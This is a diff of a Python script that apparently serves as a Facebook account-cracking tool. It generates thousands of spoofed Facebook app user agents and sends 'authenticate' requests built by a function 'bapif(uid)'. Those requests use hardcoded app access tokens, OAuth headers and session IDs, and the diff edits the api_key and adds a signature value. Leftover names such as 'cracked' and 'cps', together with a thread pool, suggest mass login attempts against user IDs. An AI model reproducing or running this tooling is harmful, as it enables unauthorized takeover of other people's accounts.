@@ -1,37 +1,23 @@
-#!/usr/bin/python3
-# creater:
-# _________[ IMPORTING MODULES ]______>>
+
 import os, requests, json, time
 import re, random, sys, uuid, string, subprocess
 from concurrent.futures import ThreadPoolExecutor as ThreadPool
 
-# __________[ EMPITY LOOP / LIST ]_______>>
-oks = []
-user_ID = []
-cps = []
-cracked = []
-pwx = []
 ualist = []
 # _______[ BASIC COLORS ]_____>>
 white = "\033[1;37m"
 rad = "\033[1;31m"
 green = "\033[1;32m"
-# _________[ LOGO ]______>>>
-def logo():
-    os.system("clear")
-    print(f"""{white}""")
-    print(50 * "-")
-
 
 # _________[ USER-AGENT LIST GENERATER ]______>>>
 for i in range(2000):
     fbs = random.choice(
         [
-            "com.facebook.adsmanager",
-            "com.facebook.lite",
-            "com.facebook.orca",
+            # "com.facebook.adsmanager",
+            # "com.facebook.lite",
+            # "com.facebook.orca",
             "com.facebook.katana",
-            "com.facebook.mlite",
+            # "com.facebook.mlite",
         ]
     )
     application_version = (
@@ -470,8 +456,9 @@ def bapif(uid):
             "locale": 'en_US"',
             "client_country_code": "US",
             "fb_api_req_friendly_name": "authenticate",
-            "api_key": "fc0a7caa49b192f64f6f5a6d9643bb28",
+            "api_key": "62f8ce9f74b12f84c123cc23437a4a32",
             "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
+            "sig":"62f8ce9f74b12f84c123cc23437a4a32"
         }
         headersX = {
             "User-Agent": useragent,
@@ -484,7 +471,7 @@ def bapif(uid):
             "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
             "X-FB-Connection-Type": "WIFI",
             "X-Tigon-Is-Retry": "False",
-            "x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=fc0a7caa49b192f64f6f5a6d9643bb28",
+            "x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32",
             "x-fb-device-group": "5120",
             "X-FB-Friendly-Name": "ViewerReactionsMutation",
             "X-FB-Request-Analytics-Tags": "graphservice",
